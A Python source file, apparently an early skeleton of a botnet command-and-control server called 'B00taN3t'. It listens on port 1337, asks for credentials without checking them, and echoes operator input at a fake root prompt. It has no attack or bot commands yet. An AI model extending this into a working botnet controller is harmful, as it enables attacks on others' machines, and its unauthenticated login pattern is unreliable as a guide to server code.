import socket, threading

from .client        import Client
from .users.main    import User

class BootaNet():
    CNC_PORT:       int = 1337;
    WEB_PORT:       int = 80;
    SERVER:         bool;
    BUF_SZ:         int = 1024;

    """ Server Logs """
    users:          list[User];
    clients:        list[Client];
    def __init__(self, cnc_p: int, web_p: int):
        print("[ + ] Starting up B00taN3t.....!")
        self.cnc_port = cnc_p;
        self.web_port = web_p;
        self.users = [];
        self.clients = [];
    
        dbfd = open("assets/db/users.db", "r");
        db_data = dbfd.read();
        db_lines = db_data.split("\n");

        print("[ + ] Loading User Database....!");

        for line in db_lines:
            if len(line) < 4: continue;
            line_info = line.replace("(", "").replace(")", "").replace("'", "").split(",")
            self.users.append(User(line_info))

        print("[ + ] Database loaded.....!")
            

    def start_cnc_server(self) -> bool:
        self.SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

        self.SERVER.bind(("0.0.0.0", self.CNC_PORT));
        self.SERVER.listen(0)

        self.server_listener()

        
    def server_listener(self) -> None:
        while(True):
            try: conn, addr = self.SERVER.accept()
            except: pass

            threading.Thread(target=self.server_authorization, args=(conn,)).start()


    def server_authorization(self, client) -> None:
        client.send("Username: ".encode())
        username = client.recv(self.BUF_SZ)

        client.send("Password: ".encode())
        password = client.recv(self.BUF_SZ)
        if password == "":
            password = client.recv(self.BUF_SZ)

        # Validate Login

        new_client = Client(username, client)
        self.clients.append(new_client)
        
        self.user_handler(new_client)

    def user_handler(self, client: Client) -> None:
        while(True):
            client.socket.send("[root@b00tab0t]# [~] ".encode())
            data = client.socket.recv(self.BUF_SZ)

            if len(data) < 2: continue;

            print(f"{data}")
